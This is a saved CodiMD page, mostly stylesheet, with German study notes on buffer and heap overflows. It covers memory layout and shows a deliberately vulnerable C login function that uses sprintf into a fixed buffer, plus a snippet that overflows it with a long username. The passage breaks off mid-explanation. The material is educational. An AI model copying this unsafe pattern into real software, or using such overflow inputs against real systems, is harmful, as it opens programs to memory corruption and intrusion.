<!DOCTYPE html>

<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="mobile-web-app-capable" content="yes">
    <title>
        Schwachstellen Zusammenfassung - CodiMD
    </title>
    <link rel="icon" type="image/png" href="https://codi.ide3.de/favicon.png">
    <link rel="apple-touch-icon" href="https://codi.ide3.de/apple-touch-icon.png">

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.4.0/css/bootstrap.min.css" integrity="sha256-H0KfTigpUV+0/5tn2HXC0CPwhhDhWgSawJdnFd0CGCo=" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fork-awesome/1.1.3/css/fork-awesome.min.css" integrity="sha256-ZhApazu+kejqTYhMF+1DzNKjIzP7KXu6AzyXcC1gMus=" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/ionicons/2.0.1/css/ionicons.min.css" integrity="sha256-3iu9jgsy9TpTwXKb7bNQzqWekRX7pPK+2OLj3R922fo=" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.5.1/themes/prism.min.css" integrity="sha256-vtR0hSWRc3Tb26iuN2oZHt3KRUomwTufNIf5/4oeCyg=" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github-gist.min.css" integrity="sha256-tAflq+ymku3Khs+I/WcAneIlafYgDiOQ9stIHH985Wo=" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@hackmd/emojify.js@2.1.0/dist/css/basic/emojify.min.css" integrity="sha256-UOrvMOsSDSrW6szVLe8ZDZezBxh5IoIfgTwdNDgTjiU=" crossorigin="anonymous" />
    <style>
        @import url(https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,400italic,600,600italic,300italic,300|Source+Serif+Pro|Source+Code+Pro:400,300,500&subset=latin,latin-ext);.markdown-body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol;font-size:16px;line-height:1.5;word-wrap:break-word}.markdown-body:after,.markdown-body:before{display:table;content:""}.markdown-body:after{clear:both}.markdown-body>:first-child{margin-top:0!important}.markdown-body>:last-child{margin-bottom:0!important}.markdown-body a:not([href]){color:inherit;text-decoration:none}.markdown-body .absent{color:#c00}.markdown-body .anchor{float:left;padding-right:4px;margin-left:-20px;line-height:1}.markdown-body .anchor:focus{outline:none}.markdown-body blockquote,.markdown-body dl,.markdown-body ol,.markdown-body p,.markdown-body pre,.markdown-body table,.markdown-body ul{margin-top:0;margin-bottom:16px}.markdown-body hr{height:.25em;padding:0;margin:24px 0;background-color:#e7e7e7;border:0}.markdown-body blockquote{padding:0 1em;color:#777;border-left:.25em solid #ddd}.night .markdown-body blockquote{color:#bcbcbc}.markdown-body blockquote>:first-child{margin-top:0}.markdown-body blockquote>:last-child{margin-bottom:0}.markdown-body .loweralpha{list-style-type:lower-alpha}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin-top:24px;margin-bottom:16px;font-weight:600;line-height:1.25}.night .markdown-body h1,.night .markdown-body h2,.night .markdown-body h3,.night .markdown-body h4,.night .markdown-body h5,.night .markdown-body h6{color:#ddd}.markdown-body h1 .fa-link,.markdown-body h2 .fa-link,.markdown-body h3 .fa-link,.markdown-body h4 .fa-link,.markdown-body h5 .fa-link,.markdown-body h6 .fa-link{color:#000;vertical-align:middle;visibility:hidden;font-size:16px}.night .markdown-body h1 .fa-link,.night .markdown-body h2 .fa-link,.night .markdown-body h3 .fa-link,.night .markdown-body h4 .fa-link,.night .markdown-body h5 .fa-link,.night .markdown-body h6 .fa-link{color:#fff}.markdown-body h1:hover .anchor,.markdown-body h2:hover .anchor,.markdown-body h3:hover .anchor,.markdown-body h4:hover .anchor,.markdown-body h5:hover .anchor,.markdown-body h6:hover .anchor{text-decoration:none}.markdown-body h1:hover .anchor .fa-link,.markdown-body h2:hover .anchor .fa-link,.markdown-body h3:hover .anchor .fa-link,.markdown-body h4:hover .anchor .fa-link,.markdown-body h5:hover .anchor .fa-link,.markdown-body h6:hover .anchor .fa-link{visibility:visible}.markdown-body h1 code,.markdown-body h1 tt,.markdown-body h2 code,.markdown-body h2 tt,.markdown-body h3 code,.markdown-body h3 tt,.markdown-body h4 code,.markdown-body h4 tt,.markdown-body h5 code,.markdown-body h5 tt,.markdown-body h6 code,.markdown-body h6 tt{font-size:inherit}.markdown-body h1{font-size:2em}.markdown-body h1,.markdown-body h2{padding-bottom:.3em;border-bottom:1px solid #eee}.markdown-body h2{font-size:1.5em}.markdown-body h3{font-size:1.25em}.markdown-body h4{font-size:1em}.markdown-body h5{font-size:.875em}.markdown-body h6{font-size:.85em;color:#777}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol.no-list,.markdown-body ul.no-list{padding:0;list-style-type:none}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:0;margin-bottom:0}.markdown-body li>p{margin-top:16px}.markdown-body li+li{margin-top:.25em}.markdown-body dl{padding:0}.markdown-body dl dt{padding:0;margin-top:16px;font-size:1em;font-style:italic;font-weight:700}.markdown-body dl dd{padding:0 16px;margin-bottom:16px}.markdown-body table{display:block;width:100%;overflow:auto;word-break:normal;word-break:keep-all}.markdown-body table th{font-weight:700}.markdown-body table td,.markdown-body table th{padding:6px 13px;border:1px solid #ddd}.markdown-body table tr{background-color:#fff;border-top:1px solid #ccc}.night .markdown-body table tr{background-color:#5f5f5f}.markdown-body table tr:nth-child(2n){background-color:#f8f8f8}.night .markdown-body table tr:nth-child(2n){background-color:#4f4f4f}.markdown-body img{max-width:100%;box-sizing:content-box;background-color:#fff}.markdown-body img[align=right]{padding-left:20px}.markdown-body img[align=left]{padding-right:20px}.markdown-body .emoji{max-width:none;vertical-align:text-top;background-color:transparent}.markdown-body span.frame{display:block;overflow:hidden}.markdown-body span.frame>span{display:block;float:left;width:auto;padding:7px;margin:13px 0 0;overflow:hidden;border:1px solid #ddd}.markdown-body span.frame span img{display:block;float:left}.markdown-body span.frame span span{display:block;padding:5px 0 0;clear:both;color:#333}.markdown-body span.align-center{display:block;overflow:hidden;clear:both}.markdown-body span.align-center>span{display:block;margin:13px auto 0;overflow:hidden;text-align:center}.markdown-body span.align-center span img{margin:0 auto;text-align:center}.markdown-body span.align-right{display:block;overflow:hidden;clear:both}.markdown-body span.align-right>span{display:block;margin:13px 0 0;overflow:hidden;text-align:right}.markdown-body span.align-right span img{margin:0;text-align:right}.markdown-body span.float-left{display:block;float:left;margin-right:13px;overflow:hidden}.markdown-body span.float-left span{margin:13px 0 0}.markdown-body span.float-right{display:block;float:right;margin-left:13px;overflow:hidden}.markdown-body span.float-right>span{display:block;margin:13px auto 0;overflow:hidden;text-align:right}.markdown-body code,.markdown-body tt{padding:.2em 0;margin:0;font-size:85%;background-color:rgba(0,0,0,.04);border-radius:3px}.night .markdown-body code,.night .markdown-body tt{color:#eee;background-color:hsla(0,0%,90.2%,.36)}.markdown-body code:after,.markdown-body code:before,.markdown-body tt:after,.markdown-body tt:before{letter-spacing:-.2em;content:"\A0"}.markdown-body code br,.markdown-body tt br{display:none}.markdown-body del code{text-decoration:inherit}.markdown-body pre{word-wrap:normal}.markdown-body pre>code{padding:0;margin:0;font-size:100%;word-break:normal;white-space:pre;background:transparent;border:0}.markdown-body .highlight{margin-bottom:16px}.markdown-body .highlight pre{margin-bottom:0;word-break:normal}.markdown-body .highlight pre,.markdown-body pre{padding:16px;overflow:auto;font-size:85%;line-height:1.45;background-color:#f7f7f7;border-radius:3px}.markdown-body pre code,.markdown-body pre tt{display:inline;max-width:auto;padding:0;margin:0;overflow:visible;line-height:inherit;word-wrap:normal;background-color:transparent;border:0}.markdown-body pre code:after,.markdown-body pre code:before,.markdown-body pre tt:after,.markdown-body pre tt:before{content:normal}.markdown-body .csv-data td,.markdown-body .csv-data th{padding:5px;overflow:hidden;font-size:12px;line-height:1;text-align:left;white-space:nowrap}.markdown-body .csv-data .blob-line-num{padding:10px 8px 9px;text-align:right;background:#fff;border:0}.markdown-body .csv-data tr{border-top:0}.markdown-body .csv-data th{font-weight:700;background:#f8f8f8;border-top:0}.markdown-body kbd{display:inline-block;padding:3px 5px;font-size:11px;line-height:10px;color:#555;vertical-align:middle;background-color:#fcfcfc;border:1px solid;border-color:#ccc #ccc #bbb;border-radius:3px;box-shadow:inset 0 -1px 0 #bbb}.news .alert .markdown-body blockquote{padding:0 0 0 40px;border:0}.activity-tab .news .alert .commits,.activity-tab .news .markdown-body blockquote{padding-left:0}.task-list-item{list-style-type:none}.task-list-item label{font-weight:400}.task-list-item.enabled label{cursor:pointer}.task-list-item+.task-list-item{margin-top:3px}.task-list-item-checkbox{float:left;margin:.31em 0 .2em -1.3em!important;vertical-align:middle;cursor:default!important}.markdown-body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol;padding-top:40px;padding-bottom:40px;max-width:758px;overflow:visible!important}.markdown-body pre{border:inherit!important}.night .markdown-body pre{filter:invert(100%)}.markdown-body code{color:inherit!important}.markdown-body pre code .wrapper{display:-webkit-inline-flex;display:-moz-inline-flex;display:-ms-inline-flex;display:-o-inline-flex;display:inline-flex}.markdown-body pre code .gutter{float:left;overflow:hidden;-webkit-user-select:none;user-select:none}.markdown-body pre code .gutter.linenumber{text-align:right;position:relative;display:inline-block;cursor:default;z-index:4;padding:0 8px 0 0;min-width:20px;box-sizing:content-box;color:#afafaf!important;border-right:3px solid #6ce26c!important}.markdown-body pre code .gutter.linenumber>span:before{content:attr(data-linenumber)}.markdown-body pre code .code{float:left;margin:0 0 0 16px}.markdown-body .gist .line-numbers{border-left:none;border-top:none;border-bottom:none}.markdown-body .gist .line-data{border:none}.markdown-body .gist table{border-spacing:0;border-collapse:inherit!important}.night .markdown-body .gist table tr:nth-child(2n){background-color:#ddd}.markdown-body code[data-gist-id]{background:none;padding:0;filter:invert(100%)}.markdown-body code[data-gist-id]:after,.markdown-body code[data-gist-id]:before{content:""}.markdown-body code[data-gist-id] .blob-num{border:unset}.markdown-body code[data-gist-id] table{overflow:unset;margin-bottom:unset}.markdown-body code[data-gist-id] table tr{background:unset}.markdown-body[dir=rtl] pre{direction:ltr}.markdown-body[dir=rtl] code{direction:ltr;unicode-bidi:embed}.markdown-body .alert>p{margin-bottom:0}.markdown-body pre.abc,.markdown-body pre.flow-chart,.markdown-body pre.geo,.markdown-body pre.graphviz,.markdown-body pre.mermaid,.markdown-body pre.sequence-diagram,.markdown-body pre.vega{text-align:center;background-color:inherit;border-radius:0;white-space:inherit}.night .markdown-body pre.graphviz .graph>polygon{fill:#333}.night .markdown-body pre.mermaid .sectionTitle,.night .markdown-body pre.mermaid .titleText,.night .markdown-body pre.mermaid text{fill:#fff}.markdown-body pre.abc>code,.markdown-body pre.flow-chart>code,.markdown-body pre.graphviz>code,.markdown-body pre.mermaid>code,.markdown-body pre.sequence-diagram>code,.markdown-body pre.vega>code{text-align:left}.markdown-body pre.abc>svg,.markdown-body pre.flow-chart>svg,.markdown-body pre.graphviz>svg,.markdown-body pre.mermaid>svg,.markdown-body pre.sequence-diagram>svg,.markdown-body pre.vega>svg{max-width:100%;height:100%}.night .markdown-body .abc path{fill:#eee}.night .markdown-body .abc path.note_selected{fill:##4DD0E1}.night tspan{fill:#fefefe}.night pre rect{fill:transparent}.night pre.flow-chart path,.night pre.flow-chart rect{stroke:#fff}.markdown-body pre>code.wrap{white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word}.markdown-body .alert>p,.markdown-body .alert>ul{margin-bottom:0}.markdown-body summary{display:list-item}.markdown-body summary:focus{outline:none}.markdown-body details summary{cursor:pointer}.markdown-body details:not([open])>:not(summary){display:none}.markdown-body figure{margin:1em 40px}.markdown-body img{background-color:transparent}.vimeo,.youtube{cursor:pointer;display:table;text-align:center;background-position:50%;background-repeat:no-repeat;background-size:contain;background-color:#000;overflow:hidden}.vimeo,.youtube{position:relative;width:100%}.youtube{padding-bottom:56.25%}.vimeo img{width:100%;object-fit:contain;z-index:0}.youtube img{object-fit:cover;z-index:0}.vimeo iframe,.youtube iframe,.youtube img{width:100%;height:100%;position:absolute;top:0;left:0}.vimeo iframe,.youtube iframe{vertical-align:middle;z-index:1}.vimeo .icon,.youtube .icon{position:absolute;height:auto;width:auto;top:50%;left:50%;transform:translate(-50%,-50%);color:#fff;opacity:.3;-webkit-transition:opacity .2s;transition:opacity .2s;z-index:0}.vimeo:hover .icon,.youtube:hover .icon{opacity:.6;-webkit-transition:opacity .2s;transition:opacity .2s}.slideshare .inner,.speakerdeck .inner{position:relative;width:100%}.slideshare .inner iframe,.speakerdeck .inner iframe{position:absolute;top:0;bottom:0;left:0;right:0;width:100%;height:100%}.geo-map{width:100%;height:250px}.markmap-container{height:300px}.markmap-container>svg{width:100%;height:100%}.MJX_Assistive_MathML{display:none}.ui-infobar{position:relative;z-index:2;max-width:758px;margin-top:25px;margin-bottom:-25px;color:#777}.toc .invisable-node{list-style-type:none}.ui-toc{position:fixed;bottom:20px;z-index:10000}.ui-toc-label{opacity:.9;background-color:#ccc;border:none}.ui-toc-label,.ui-toc .open .ui-toc-label{-webkit-transition:opacity .2s;transition:opacity .2s}.ui-toc .open .ui-toc-label{opacity:1;color:#5f5f5f}.ui-toc-label:focus{opacity:1;background-color:#ccc;color:#000}.ui-toc-label:hover{opacity:1;background-color:#ccc;-webkit-transition:opacity .2s;transition:opacity .2s}.ui-toc-dropdown{margin-top:23px;margin-bottom:20px;padding-left:10px;padding-right:10px;max-width:45vw;width:25vw;max-height:70vh;overflow:auto;text-align:inherit}.ui-toc-dropdown>.toc{max-height:calc(70vh - 100px);overflow:auto}.ui-toc-dropdown[dir=rtl] .nav{padding-right:0;letter-spacing:.0029em}.ui-toc-dropdown a{overflow:hidden;text-overflow:ellipsis;white-space:pre}.ui-toc-dropdown .nav>li>a{display:block;padding:4px 20px;font-size:13px;font-weight:500;color:#767676}.ui-toc-dropdown .nav>li:first-child:last-child>ul,.ui-toc-dropdown .toc.expand ul{display:block}.ui-toc-dropdown .nav>li>a:focus,.ui-toc-dropdown .nav>li>a:hover{padding-left:19px;color:#000;text-decoration:none;background-color:transparent;border-left:1px solid #000}.night .ui-toc-dropdown .nav>li>a:focus,.night .ui-toc-dropdown .nav>li>a:hover{color:#fff;border-left-color:#fff}.ui-toc-dropdown[dir=rtl] .nav>li>a:focus,.ui-toc-dropdown[dir=rtl] .nav>li>a:hover{padding-right:19px;border-left:none;border-right:1px solid #000}.ui-toc-dropdown .nav>.active:focus>a,.ui-toc-dropdown .nav>.active:hover>a,.ui-toc-dropdown .nav>.active>a{padding-left:18px;font-weight:700;color:#000;background-color:transparent;border-left:2px solid #000}.night .ui-toc-dropdown .nav>.active:focus>a,.night .ui-toc-dropdown .nav>.active:hover>a,.night .ui-toc-dropdown .nav>.active>a{color:#fff;border-left:2px solid #fff}.ui-toc-dropdown[dir=rtl] .nav>.active:focus>a,.ui-toc-dropdown[dir=rtl] .nav>.active:hover>a,.ui-toc-dropdown[dir=rtl] .nav>.active>a{padding-right:18px;border-left:none;border-right:2px solid #000}.ui-toc-dropdown .nav .nav{display:none;padding-bottom:10px}.ui-toc-dropdown .nav>.active>ul{display:block}.ui-toc-dropdown .nav .nav>li>a{padding-top:1px;padding-bottom:1px;padding-left:30px;font-size:12px;font-weight:400}.night .ui-toc-dropdown .nav>li>a{color:#aaa}.ui-toc-dropdown[dir=rtl] .nav .nav>li>a{padding-right:30px}.ui-toc-dropdown .nav .nav>li>ul>li>a{padding-top:1px;padding-bottom:1px;padding-left:40px;font-size:12px;font-weight:400}.ui-toc-dropdown[dir=rtl] .nav .nav>li>ul>li>a{padding-right:40px}.ui-toc-dropdown .nav .nav>li>ul>li>ul>li>a{padding-top:1px;padding-bottom:1px;padding-left:50px;font-size:12px;font-weight:400}.ui-toc-dropdown[dir=rtl] .nav .nav>li>ul>li>ul>li>a{padding-right:50px}.ui-toc-dropdown .nav .nav>li>ul>li>ul>li>ul>li>a{padding-top:1px;padding-bottom:1px;padding-left:60px;font-size:12px;font-weight:400}.ui-toc-dropdown[dir=rtl] .nav .nav>li>ul>li>ul>li>ul>li>a{padding-right:60px}.ui-toc-dropdown .nav .nav>li>a:focus,.ui-toc-dropdown .nav .nav>li>a:hover{padding-left:29px}.ui-toc-dropdown[dir=rtl] .nav .nav>li>a:focus,.ui-toc-dropdown[dir=rtl] .nav .nav>li>a:hover{padding-right:29px}.ui-toc-dropdown .nav .nav>li>ul>li>a:focus,.ui-toc-dropdown .nav .nav>li>ul>li>a:hover{padding-left:39px}.ui-toc-dropdown[dir=rtl] .nav .nav>li>ul>li>a:focus,.ui-toc-dropdown[dir=rtl] .nav .nav>li>ul>li>a:hover{padding-right:39px}.ui-toc-dropdown .nav .nav>li>ul>li>ul>li>a:focus,.ui-toc-dropdown .nav .nav>li>ul>li>ul>li>a:hover{padding-left:49px}.ui-toc-dropdown[dir=rtl] .nav .nav>li>ul>li>ul>li>a:focus,.ui-toc-dropdown[dir=rtl] .nav .nav>li>ul>li>ul>li>a:hover{padding-right:49px}.ui-toc-dropdown .nav .nav>li>ul>li>ul>li>ul>li>a:focus,.ui-toc-dropdown .nav .nav>li>ul>li>ul>li>ul>li>a:hover{padding-left:59px}.ui-toc-dropdown[dir=rtl] .nav .nav>li>ul>li>ul>li>ul>li>a:focus,.ui-toc-dropdown[dir=rtl] .nav .nav>li>ul>li>ul>li>ul>li>a:hover{padding-right:59px}.ui-toc-dropdown .nav .nav>.active:focus>a,.ui-toc-dropdown .nav .nav>.active:hover>a,.ui-toc-dropdown .nav .nav>.active>a{padding-left:28px;font-weight:500}.ui-toc-dropdown[dir=rtl] .nav .nav>.active:focus>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active:hover>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active>a{padding-right:28px}.ui-toc-dropdown .nav .nav>.active>.nav>.active:focus>a,.ui-toc-dropdown .nav .nav>.active>.nav>.active:hover>a,.ui-toc-dropdown .nav .nav>.active>.nav>.active>a{padding-left:38px;font-weight:500}.ui-toc-dropdown[dir=rtl] .nav .nav>.active>.nav>.active:focus>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active>.nav>.active:hover>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active>.nav>.active>a{padding-right:38px}.ui-toc-dropdown .nav .nav>.active>.nav>.active>.nav>.active:focus>a,.ui-toc-dropdown .nav .nav>.active>.nav>.active>.nav>.active:hover>a,.ui-toc-dropdown .nav .nav>.active>.nav>.active>.nav>.active>a{padding-left:48px;font-weight:500}.ui-toc-dropdown[dir=rtl] .nav .nav>.active>.active>.nav>.nav>.active>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active>.nav>.active>.nav>.active:focus>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active>.nav>.active>.nav>.active:hover>a{padding-right:48px}.ui-toc-dropdown .nav .nav>.active>.nav>.active>.nav>.active>.nav>.active:focus>a,.ui-toc-dropdown .nav .nav>.active>.nav>.active>.nav>.active>.nav>.active:hover>a,.ui-toc-dropdown .nav .nav>.active>.nav>.active>.nav>.active>.nav>.active>a{padding-left:58px;font-weight:500}.ui-toc-dropdown[dir=rtl] .nav .nav>.active>.active>.nav>.nav>.active>.nav>.active>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active>.nav>.active>.nav>.active>.nav>.active:focus>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active>.nav>.active>.nav>.active>.nav>.active:hover>a{padding-right:58px}.markdown-body[lang^=ja]{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Helvetica,Arial,Hiragino Kaku Gothic Pro,"\30D2\30E9\30AE\30CE\89D2\30B4   Pro W3",Osaka,Meiryo,"\30E1\30A4\30EA\30AA",MS Gothic,"\FF2D\FF33   \30B4\30B7\30C3\30AF",sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol}.ui-toc-dropdown[lang^=ja]{font-family:Source Sans Pro,Helvetica,Arial,Meiryo UI,MS PGothic,"\FF2D\FF33   \FF30\30B4\30B7\30C3\30AF",sans-serif}.markdown-body[lang=zh-tw]{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Helvetica,Arial,PingFang TC,Microsoft JhengHei,"\5FAE\8EDF\6B63\9ED1",sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol}.ui-toc-dropdown[lang=zh-tw]{font-family:Source Sans Pro,Helvetica,Arial,Microsoft JhengHei UI,"\5FAE\8EDF\6B63\9ED1UI",sans-serif}.markdown-body[lang=zh-cn]{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Helvetica,Arial,PingFang SC,Microsoft YaHei,"\5FAE\8F6F\96C5\9ED1",sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol}.ui-toc-dropdown[lang=zh-cn]{font-family:Source Sans Pro,Helvetica,Arial,Microsoft YaHei UI,"\5FAE\8F6F\96C5\9ED1UI",sans-serif}.ui-affix-toc{position:fixed;top:0;max-width:15vw;max-height:70vh;overflow:auto}.back-to-top,.expand-toggle,.go-to-bottom{display:block;padding:4px 10px;margin-top:10px;margin-left:10px;font-size:12px;font-weight:500;color:rgba(0,0,0,.85)}.back-to-top:focus,.back-to-top:hover,.expand-toggle:focus,.expand-toggle:hover,.go-to-bottom:focus,.go-to-bottom:hover{color:#563d7c;text-decoration:none}.back-to-top,.go-to-bottom{margin-top:0}.ui-user-icon{width:20px;height:20px;display:block;border-radius:3px;margin-top:2px;margin-bottom:2px;margin-right:5px;background-position:50%;background-repeat:no-repeat;background-size:contain}.ui-user-icon.small{width:18px;height:18px;display:inline-block;vertical-align:middle;margin:0 0 .2em}small span{line-height:22px}small .dropdown{display:inline-block}small .dropdown a:focus,small .dropdown a:hover{text-decoration:none}.unselectable{-moz-user-select:none;-khtml-user-select:none;-webkit-user-select:none;-o-user-select:none;user-select:none}.night .navbar{background:#333;border-bottom-color:#333;color:#eee}.night .navbar a{color:#eee}@media print{blockquote,div,img,pre,table{page-break-inside:avoid!important}a[href]:after{font-size:12px!important}}.markdown-body.slides{position:relative;z-index:1;color:#222}.markdown-body.slides:before{content:"";display:block;position:absolute;top:0;left:0;right:0;bottom:0;z-index:-1;background-color:currentColor;box-shadow:0 0 0 50vw}.markdown-body.slides section[data-markdown]{position:relative;margin-bottom:1.5em;background-color:#fff;text-align:center}.markdown-body.slides section[data-markdown] code{text-align:left}.markdown-body.slides section[data-markdown]:before{content:"";display:block;padding-bottom:56.23%}.markdown-body.slides section[data-markdown]>div:first-child{position:absolute;top:50%;left:1em;right:1em;transform:translateY(-50%);max-height:100%;overflow:hidden}.markdown-body.slides section[data-markdown]>ul{display:inline-block}.markdown-body.slides>section>section+section:after{content:"";position:absolute;top:-1.5em;right:1em;height:1.5em;border:3px solid #777}body{font-smoothing:subpixel-antialiased!important;-webkit-font-smoothing:subpixel-antialiased!important;-moz-osx-font-smoothing:auto!important;text-shadow:0 0 1em transparent,1px 1px 1.2px rgba(0,0,0,.004);-webkit-overflow-scrolling:touch;font-family:Source Sans Pro,Helvetica,Arial,sans-serif;letter-spacing:.025em}.focus,:focus{outline:none!important}::-moz-focus-inner{border:0!important}body.modal-open{overflow-y:auto;padding-right:0!important}
    </style>
    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    	<script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js" integrity="sha256-3Jy/GbSLrg0o9y5Z5n1uw0qxZECH7C6OQpVBgNFYa0g=" crossorigin="anonymous"></script>
    	<script src="https://cdnjs.cloudflare.com/ajax/libs/respond.js/1.4.2/respond.min.js" integrity="sha256-g6iAfvZp+nDQ2TdTR/VVKJf3bGro4ub5fvWSWVRi2NE=" crossorigin="anonymous"></script>
		<script src="https://cdnjs.cloudflare.com/ajax/libs/es5-shim/4.5.9/es5-shim.min.js" integrity="sha256-8E4Is26QH0bD52WoQpcB+R/tcWQtpzlCojrybUd7Mxo=" crossorigin="anonymous"></script>
    <![endif]-->
</head>

<body>
    <div id="doc" class="markdown-body container-fluid"><h1 id="Schwachstellen-Zusammenfassung"><a class="anchor hidden-xs" href="#Schwachstellen-Zusammenfassung" title="Schwachstellen-Zusammenfassung"><i class="fa fa-link"></i></a>Schwachstellen Zusammenfassung</h1><hr><h1 id="Buffer--und-Heapoverflows"><a class="anchor hidden-xs" href="#Buffer--und-Heapoverflows" title="Buffer--und-Heapoverflows"><i class="fa fa-link"></i></a>Buffer- und Heapoverflows</h1><p>Ein Prozess, also ein laufendes Programm besteht aus diesen drei Abschnitte. Sie sind direkt miteinander im Speicherbereich verknüpft</p><ol>
<li>Code: Dieser Bereich enthält den kompilierten Code des Programms oder gemeinsam genutzte Bibliotheken. Der Code wird vom Betriebssystem geladen und während der Ausführung des Programms ausgeführt.</li>
<li>Daten: Hier werden die nicht-lokalen Variablen des Programms gespeichert. Zusätzlich befindet sich hier der Heap, der für die dynamische Speicherzuweisung während der Laufzeit des Programms genutzt wird.</li>
<li>Der Stack speichert dynamisch allozierte Daten für jede der gerade ausgeführten Funktionen oder Methoden. Dazu gehören lokale Variablen, das aktuelle Objekt bei Objektorientierung und die Rücksprungadresse, die angibt, wo die Ausführung nach Beendigung der Funktion fortgesetzt wird.</li>
</ol><p><img src="https://codi.ide3.de/uploads/upload_a957253198e4628f90fabb7251418a32.png" alt="" class="md-image md-image"></p><h2 id="Speicherkorruption"><a class="anchor hidden-xs" href="#Speicherkorruption" title="Speicherkorruption"><i class="fa fa-link"></i></a>Speicherkorruption</h2><p>In C und C++ muss man Speicher selbst vorher zuweisen:</p><ul>
<li><strong>Szenario: Platzierung von m Bytes in einen Puffer der Größe n, für m &gt; n</strong></li>
<li>Wenn man das falsch macht, dann stürzt das Programm ab</li>
<li>Oder das Programm läuft weiter, aber geht über die zugewiesenen Grenzen des Buffers oder Heaps hinaus</li>
<li><strong>Folge ist Korruption angrenzenden Speicher</strong></li>
<li>Dies kann man für Angriffe ausnutzen</li>
<li>In z. B. Python oder Java muss man das nicht. Der Speicher wird dynamisch zugewiesen und wieder freigegeben.</li>
</ul><h2 id="Beispiel"><a class="anchor hidden-xs" href="#Beispiel" title="Beispiel"><i class="fa fa-link"></i></a>Beispiel</h2><pre><code class="c hljs"><span class="hljs-type">int</span> authenticate(<span class="hljs-type">char</span> *username, <span class="hljs-type">char</span> *<span class="hljs-keyword">password</span>) {
    <span class="hljs-type">int</span> authenticated; // flag, non-zero <span class="hljs-keyword">if</span> authenticated
    <span class="hljs-type">char</span> buffer[<span class="hljs-number">1024</span>]; // buffer <span class="hljs-keyword">for</span> <span class="hljs-keyword">log</span> message
    authenticated = verify_password(username, <span class="hljs-keyword">password</span>);
    <span class="hljs-keyword">if</span> (authenticated == <span class="hljs-number">0</span>) {
        sprintf(buffer, "Incorrect password for user %s\n", username);
        log("%s", buffer);
    }
    <span class="hljs-keyword">return</span> authenticated;
}
</code></pre><p>In diesem Beispiel gibt es eine Funktion <code>authenticate</code>, die überprüft, ob ein Benutzer mit einem gegebenen Benutzernamen und Passwort authentifiziert ist.</p><h3 id="Erklärung-des-Bufferoverflow"><a class="anchor hidden-xs" href="#Erklärung-des-Bufferoverflow" title="Erklärung-des-Bufferoverflow"><i class="fa fa-link"></i></a>Erklärung des Bufferoverflow</h3><ol>
<li>
<p><strong>Puffer (Buffer)</strong>:</p>
<ul>
<li>Der <code>buffer</code> ist ein Array von Zeichen (<code>char</code>), das 1024 Zeichen speichern kann. Es wird verwendet, um eine Protokollnachricht (log message) zu speichern.</li>
</ul>
</li>
<li>
<p><strong>Problemstellung</strong>:</p>
<ul>
<li>Die Funktion <code>sprintf</code> wird verwendet, um eine formatierte Zeichenkette in den <code>buffer</code> zu schreiben. Wenn der Benutzername (<code>username</code>) jedoch länger als 1024 Zeichen ist, überschreibt <code>sprintf</code> den <code>buffer</code> und greift auf den Speicher außerhalb dieses Puffers zu.</li>
</ul>
</li>
<li>
<p><strong>Wie der Buffer Overflow passiert</strong>:</p>
<ul>
<li>Angenommen, jemand gibt einen sehr langen Benutzernamen ein, der länger als 1024 Zeichen ist:<pre><code class="c hljs"><span class="hljs-keyword">char</span> long_username[<span class="hljs-number">2000</span>];
<span class="hljs-built_in">memset</span>(long_username, <span class="hljs-string">'A'</span>, <span class="hljs-number">1999</span>); <span class="hljs-comment">// 1999 'A's</span>
long_username[<span class="hljs-number">1999</span>] = <span class="hljs-string">'\0'</span>; <span class="hljs-comment">// Null-Terminierung</span>
authenticate(long_username, <span class="hljs-string">"password"</span>);
</code></pre>
</li>
<li>Wenn <code>sprintf</code> versucht, die Nachricht <code>Incorrect password for user ...</code> zu generieren, schreibt es mehr als 1024 Zeichen in den <code>buffer</code>. Dies überschreibt den Speicherbereich direkt nach dem Puffer.</li>
</ul>
</li>
<li>
